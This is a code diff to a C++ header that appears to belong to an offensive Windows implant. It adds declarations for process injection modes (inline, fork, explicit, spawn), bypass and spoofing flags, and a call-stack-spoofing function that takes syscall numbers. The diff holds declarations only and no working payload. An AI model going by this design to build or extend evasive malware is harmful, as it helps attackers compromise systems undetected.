@@ -24,6 +24,8 @@ typedef BindingFlags  IBindingFlags;
 #define G_INSTANCE         INSTANCE* Instance = (INSTANCE*)( NtCurrentPeb()->TelemetryCoverageHeader );
 #define DECLFN             __attribute__( ( section( ".text$B" ) ) )
 
+#define min(a, b) ((a) < (b) ? (a) : (b))
+
 #define NtCurrentThreadID HandleToUlong( NtCurrentTeb()->ClientId.UniqueThread )
 
 #define RSL_IMP( w, m ) { \
@@ -114,13 +116,26 @@ struct _STACK_FRAME {
 };
 typedef _STACK_FRAME STACK_FRAME;
 
+#define KH_METHOD_INLINE 0x15
+#define KH_METHOD_FORK   0x20
+
+#define KH_INJECT_EXPLICIT 0x100
+#define KH_INJECT_SPAWN    0x200
+
 struct _INSTANCE {
     PVOID HeapHandle;
     PVOID Start;
     UPTR  Size;
 
     struct {
-        BOOL   Fork;
+        BOOL  IsSpoof;
+        BOOL  KeepLoad;
+        ULONG Bypass;
+        ULONG ExecMethod;
+        ULONG ForkCategory;
+    } Ctx;
+
+    struct {
         CHAR*  Name;
         HANDLE Write;
         HANDLE Read;
@@ -187,6 +202,7 @@ struct _INSTANCE {
         DECLAPI( CreateNamedPipeA );
         DECLAPI( ConnectNamedPipe );
         DECLAPI( DisconnectNamedPipe );
+        DECLAPI( CreateFileA );
         DECLAPI( WriteFile );
         DECLAPI( ReadFile );
         DECLAPI( FlushFileBuffers );
@@ -207,6 +223,11 @@ struct _INSTANCE {
         DECLAPI( RtlLookupFunctionEntry );
         DECLAPI( RtlUserThreadStart );
         DECLAPI( BaseThreadInitThunk );
+
+        DECLAPI( WaitForSingleObject );
+
+        DECLAPI( RtlExitUserProcess );
+        DECLAPI( RtlExitUserThread  );
     } Win32;
 
     struct {
@@ -225,25 +246,25 @@ typedef _INSTANCE INSTANCE;
 
 namespace Spoof {
     auto Call(
-        PVOID Fnc, 
-        PVOID Ssn, 
-        PVOID Arg1 = 0,
-        PVOID Arg2 = 0,
-        PVOID Arg3 = 0,
-        PVOID Arg4 = 0,
-        PVOID Arg5 = 0,
-        PVOID Arg6 = 0,
-        PVOID Arg7 = 0,
-        PVOID Arg8 = 0,
-        PVOID Arg9 = 0,
-        PVOID Arg10 = 0,
-        PVOID Arg11 = 0,
-        PVOID Arg12 = 0
+        _In_ UPTR Fnc, 
+        _In_ UPTR Ssn, 
+        _In_ UPTR Arg1  = 0,
+        _In_ UPTR Arg2  = 0,
+        _In_ UPTR Arg3  = 0,
+        _In_ UPTR Arg4  = 0,
+        _In_ UPTR Arg5  = 0,
+        _In_ UPTR Arg6  = 0,
+        _In_ UPTR Arg7  = 0,
+        _In_ UPTR Arg8  = 0,
+        _In_ UPTR Arg9  = 0,
+        _In_ UPTR Arg10 = 0,
+        _In_ UPTR Arg11 = 0,
+        _In_ UPTR Arg12 = 0
     ) -> PVOID;
 
     auto StackSize(
-        PVOID RtmFunction,
-        PVOID ImgBase
+        UPTR RtmFunction,
+        UPTR ImgBase
     ) -> UPTR;
 
     auto StackSizeWrapper(
@@ -324,7 +345,7 @@ namespace Mem {
 
     auto Zero(
         _In_ PVOID Addr,
-        _In_ PVOID Size
+        _In_ UPTR  Size
     ) -> void;
 }
 
